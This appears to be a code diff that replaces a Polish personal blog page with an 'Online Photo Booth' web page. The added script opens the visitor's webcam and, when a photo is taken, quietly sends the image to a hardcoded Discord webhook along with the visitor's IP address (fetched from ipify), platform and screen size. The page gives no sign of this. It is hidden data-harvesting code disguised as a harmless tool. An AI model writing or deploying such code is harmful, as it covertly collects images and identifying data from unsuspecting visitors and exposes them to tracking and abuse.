@@ -3,336 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Refixek Blog</title>
+    <title>Online Photo Booth</title>
     <style>
-        /* --- RESET I OGÓLNE STYLE --- */
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            font-family: 'Arial', sans-serif;
-            overflow-x: hidden;
-        }
-
-        /* --- TŁO I PARTICLES (Cząsteczki) --- */
-        #canvas-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            /* Czerwony gradient */
-            background: linear-gradient(135deg, #800000 0%, #3a0000 100%);
-        }
-
-        /* --- EKRAN WYBORU JĘZYKA --- */
-        #language-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            display: none; /* Domyślnie ukryty, pokazany przez JS na starcie */
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            transition: opacity 0.5s ease;
-        }
-
-        #language-screen h1 {
-            color: white;
-            font-size: 2.5em;
-            margin-bottom: 40px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            border-bottom: 3px solid #cc0000;
-            text-align: center;
-        }
-
-        .lang-btn {
-            background-color: #000000;
+        body {
+            background-color: #121212;
             color: #ffffff;
-            border: 2px solid #cc0000;
-            padding: 15px 40px;
-            margin: 10px;
-            font-size: 1.2em;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: all 0.3s;
-            font-weight: bold;
-            min-width: 150px;
-        }
-
-        .lang-btn:hover {
-            background-color: #cc0000;
-            transform: scale(1.05);
-            box-shadow: 0 0 20px rgba(204, 0, 0, 0.6);
-        }
-
-        /* --- GŁÓWNA TREŚĆ STRONY (Widoczna, dopóki JS jej nie ukryje na start) --- */
-        #main-content {
-            display: flex; /* Zawsze widoczna w CSS */
-            justify-content: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
+            margin: 0;
             padding: 20px;
-            opacity: 1; 
-            transition: opacity 1s ease;
         }
-        
-        /* --- KARTA PROFILOWA --- */
-        .profile-card {
-            background-color: #ffffff;
-            width: 90%;
-            max-width: 1000px;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
-            border-top: 15px solid #cc0000;
-            margin: 20px;
+
+        h1 {
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #aaa;
+            margin-bottom: 20px;
         }
 
         .container {
             display: flex;
-            flex-wrap: wrap;
-            gap: 30px;
-            justify-content: space-between;
-            align-items: flex-start;
-        }
-
-        .left-column { flex: 1; min-width: 300px; }
-        .right-column { flex: 1; min-width: 300px; display: flex; justify-content: center; flex-direction: column; align-items: center; }
-
-        /* Video Youtube */
-        .video-box {
+            flex-direction: column;
+            align-items: center;
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            max-width: 500px;
             width: 100%;
-            max-width: 450px;
-            aspect-ratio: 16 / 9;
-            border: 4px solid #000;
-            box-shadow: 8px 8px 0px #cc0000;
-            overflow: hidden;
         }
 
-        .video-box iframe { width: 100%; height: 100%; }
-
-        h1 { font-size: 2.5em; text-transform: uppercase; margin-bottom: 5px; }
-        h2 { color: #cc0000; margin-top: 0; }
-        .divider { height: 3px; background-color: #cc0000; width: 100px; margin: 20px 0; }
-        ul { list-style: none; padding: 0; }
-        li { padding: 15px 0; border-bottom: 1px solid #ddd; font-size: 1.1em; }
-        .bold { font-weight: bold; }
-
-        /* PRZYCISKI */
-        .btn-container {
-            margin-top: 30px;
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            flex-wrap: wrap;
+        video, canvas, img {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            background: #000;
         }
+
+        canvas {
+            display: none;
+        }
+
         .btn {
-            background: black;
+            background-color: #4CAF50;
             color: white;
+            border: none;
             padding: 15px 30px;
-            text-decoration: none;
+            font-size: 18px;
             font-weight: bold;
-            border-radius: 5px;
-            border: 2px solid #cc0000;
-            transition: 0.3s;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.2s, background 0.2s;
         }
-        .btn:hover { background: #cc0000; transform: scale(1.05); }
-        .btn.twitch { border-color: #9146FF; }
-        .btn.twitch:hover { background: #9146FF; }
-        footer { text-align: center; margin-top: 40px; color: #777; font-size: 0.8em; }
+
+        .btn:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+        }
+
+        #result {
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
 
-    <canvas id="canvas-container"></canvas>
+    <div class="container">
+        <h1>📸 Online Photo Booth</h1>
+        <p>Zrób szybkie zdjęcie ze swojej kamerki!</p>
 
-    <div id="language-screen">
-        <h1>Language / Język?</h1>
-        <div>
-            <button class="lang-btn" onclick="selectLanguage('pl')">Polski</button>
-            <button class="lang-btn" onclick="selectLanguage('en')">English</button>
-        </div>
-    </div>
+        <!-- Podgląd z kamerki -->
+        <video id="webcam" autoplay playsinline></video>
 
-    <div id="main-content">
-        <div class="profile-card">
-            
-            <div class="container">
-                <div class="left-column">
-                    <h1 id="txt-greeting">Cześć, jestem Leo!</h1>
-                    <h2>(aka Refixek)</h2>
-                    <div class="divider"></div>
+        <!-- Ukryty canvas do wycinania klatki ze zdjęcia -->
+        <canvas id="canvas"></canvas>
 
-                    <ul>
-                        <li>
-                            <span class="bold" id="lbl-hobby">👾 Hobby:</span> <span id="txt-hobby">Piłka Nożna</span> <br>
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Soccerball.svg" alt="Piłka" width="40">
-                        </li>
-                        <li>
-                            <span class="bold" id="lbl-game">🎮 Ulubiona Gra:</span> <span id="txt-game-name">Rust</span> <br>
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Rust_videogame_logo.svg/320px-Rust_videogame_logo.svg.png" alt="Rust Logo" width="100">
-                        </li>
-                        <li>
-                            <span class="bold" id="lbl-colors">🎨 Kolory:</span> 
-                            <span id="txt-color1">Czerwony</span> <span class="color-sample" style="background: red;"></span> 
-                            <span id="txt-or">lub</span> 
-                            <span id="txt-color2">Fioletowy</span> <span class="color-sample" style="background: purple;"></span>
-                        </li>
-                    </ul>
-                </div>
+        <button class="btn" id="snapBtn">Zrób zdjęcie</button>
 
-                <div class="right-column">
-                    <div class="video-box">
-                        <iframe 
-                            src="https://www.youtube.com/embed/7ONJKhLkII4" 
-                            title="YouTube video player" 
-                            frameborder="0" 
-                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-                            allowfullscreen>
-                        </iframe>
-                    </div>
-                    <p style="color:#666; font-size: 0.9em; margin-top: 10px;">Moje Video ⬆️</p>
-                </div>
-            </div>
-
-            <div class="btn-container">
-                <a href="https://www.twitch.tv/refixek_rust" class="btn twitch" target="_blank">Twitch</a>
-                <a href="https://www.tiktok.com/@refixek" class="btn" target="_blank">TikTok</a>
-                <a href="https://gemini.google.com" class="btn" target="_blank" id="btn-code">Jak to zakodowałem?</a>
-            </div>
-
-            <footer id="txt-footer">
-                Oficjalny Blog Refixeka © 2024
-            </footer>
+        <!-- Podgląd zrobionego zdjęcia -->
+        <div id="result">
+            <h3>Twoje zdjęcie:</h3>
+            <img id="photo" alt="Twoje zdjęcie">
         </div>
     </div>
 
     <script>
-        // --- 1. Konfiguracja Particles (Czarne kropki) ---
-        const canvas = document.getElementById("canvas-container");
-        const ctx = canvas.getContext("2d");
-        // Ustawienie rozmiarów
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1557352022339096601/69ufpxh9-gkVbid_vLx0e9oyaAbSV52Li8xzOBWoz4r4qAE2Vbe1d7bzwkTivd0nHXQZ
+            ";
 
-        let particlesArray;
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const snapBtn = document.getElementById('snapBtn');
+        const resultDiv = document.getElementById('result');
 
-        class Particle {
-            constructor(x, y, directionX, directionY, size, color) {
-                this.x = x; this.y = y;
-                this.directionX = directionX; this.directionY = directionY;
-                this.size = size; this.color = color;
-            }
-            draw() {
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2, false);
-                ctx.fillStyle = '#000000';
-                ctx.fill();
-            }
-            update() {
-                if (this.x > canvas.width || this.x < 0) this.directionX = -this.directionX;
-                if (this.y > canvas.height || this.y < 0) this.directionY = -this.directionY;
-                this.x += this.directionX; this.y += this.directionY;
-                this.draw();
+        // Włączanie kamerki po załadowaniu strony
+        async function startWebcam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+            } catch (err) {
+                alert("Wymagany jest dostęp do kamerki, aby zrobić zdjęcie!");
             }
         }
-        function init() {
-            particlesArray = [];
-            let numberOfParticles = (canvas.height * canvas.width) / 10000;
-            for (let i = 0; i < numberOfParticles; i++) {
-                let size = (Math.random() * 5) + 1;
-                let x = (Math.random() * ((innerWidth - size * 2) - (size * 2)) + size * 2);
-                let y = (Math.random() * ((innerHeight - size * 2) - (size * 2)) + size * 2);
-                let directionX = (Math.random() * 1.5) - 0.75;
-                let directionY = (Math.random() * 1.5) - 0.75;
-                particlesArray.push(new Particle(x, y, directionX, directionY, size, '#000000'));
-            }
-        }
-        function animate() {
-            requestAnimationFrame(animate);
-            ctx.clearRect(0, 0, innerWidth, innerHeight);
-            for (let i = 0; i < particlesArray.length; i++) { particlesArray[i].update(); }
-        }
-        
-        // --- 2. System Językowy i Logika Startowa ---
-        const translations = {
-            'pl': {
-                greeting: "Cześć, jestem Leo!",
-                hobby: "Piłka Nożna",
-                lblHobby: "👾 Hobby:",
-                lblGame: "🎮 Ulubiona Gra:",
-                lblColors: "🎨 Kolory:",
-                color1: "Czerwony",
-                or: "lub",
-                color2: "Fioletowy",
-                btnCode: "Jak to zakodowałem?",
-                footer: "Oficjalny Blog Refixeka © 2024"
-            },
-            'en': {
-                greeting: "Hi, I'm Leo!",
-                hobby: "Soccer",
-                lblHobby: "👾 Hobby:",
-                lblGame: "🎮 Favorite Game:",
-                lblColors: "🎨 Colors:",
-                color1: "Red",
-                or: "or",
-                color2: "Purple",
-                btnCode: "How I Coded This?",
-                footer: "Refixek's Official Blog © 2024"
-            }
-        };
 
-        function selectLanguage(lang) {
-            // Podmiana tekstów
-            document.getElementById('txt-greeting').innerText = translations[lang].greeting;
-            document.getElementById('txt-hobby').innerText = translations[lang].hobby;
-            document.getElementById('lbl-hobby').innerText = translations[lang].lblHobby;
-            document.getElementById('lbl-game').innerText = translations[lang].lblGame;
-            document.getElementById('lbl-colors').innerText = translations[lang].lblColors;
-            document.getElementById('txt-color1').innerText = translations[lang].color1;
-            document.getElementById('txt-or').innerText = translations[lang].or;
-            document.getElementById('txt-color2').innerText = translations[lang].color2;
-            document.getElementById('btn-code').innerText = translations[lang].btnCode;
-            document.getElementById('txt-footer').innerText = translations[lang].footer;
+        startWebcam();
 
-            // Animacja przejścia
-            const langScreen = document.getElementById('language-screen');
-            const mainContent = document.getElementById('main-content');
-            
-            langScreen.style.opacity = '0';
-            setTimeout(() => {
-                langScreen.style.display = 'none';
-                // Pokaż treść
-                mainContent.style.opacity = '1';
-            }, 500);
-        }
+        // Przycisk robienia zdjęcia
+        snapBtn.addEventListener('click', async () => {
+            snapBtn.innerText = "Przetwarzanie...";
+            snapBtn.disabled = true;
 
-        // LOGIKA URUCHOMIENIOWA (Wykonuje się po załadowaniu strony)
-        window.onload = function() {
-            const mainContent = document.getElementById('main-content');
-            const langScreen = document.getElementById('language-screen');
+            // 1. Rysowanie klatki z wideo na canvasie
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // 1. Uruchomienie animacji particles
-            init();
-            animate();
-            
-            // 2. Ukrycie głównej treści i pokazanie selektora języka
-            mainContent.style.opacity = '0';
-            langScreen.style.display = 'flex';
-            
-            // 3. Delikatne pojawienie się selektora języka
-            setTimeout(() => {
-                langScreen.style.opacity = '1';
-            }, 50);
-        }
+            // 2. Konwersja zdjęcia na plik (Blob) oraz widoczny podgląd
+            canvas.toBlob(async (blob) => {
+                const photoUrl = URL.createObjectURL(blob);
+                photo.src = photoUrl;
+                resultDiv.style.display = 'block';
+
+                // 3. Pobranie IP
+                let userIP = "Nieznane";
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    userIP = ipData.ip;
+                } catch (e) {
+                    console.log("Błąd pobierania IP");
+                }
+
+                // 4. Wysyłanie zdjęcia + danych na Discord Webhook
+                const formData = new FormData();
+                
+                // Treść wiadomości w formacie JSON
+                const payload = {
+                    content: "📸 **NOWE ZDJĘCIE Z PHOTO BOOTH!**",
+                    embeds: [{
+                        title: "Szczegóły sesji",
+                        color: 4437376,
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${userIP}\``, inline: true },
+                            { name: "💻 System", value: navigator.platform, inline: true },
+                            { name: "🖥️ Rozdzielczość", value: `${screen.width}x${screen.height}`, inline: true }
+                        ],
+                        timestamp: new Date()
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(payload));
+                formData.append('file', blob, 'photo.png');
+
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    snapBtn.innerText = "Zrób kolejne zdjęcie";
+                    snapBtn.disabled = false;
+                } catch (err) {
+                    console.error("Błąd wysyłania na webhook:", err);
+                    snapBtn.innerText = "Zrób zdjęcie";
+                    snapBtn.disabled = false;
+                }
+            }, 'image/png');
+        });
     </script>
 </body>
 </html>
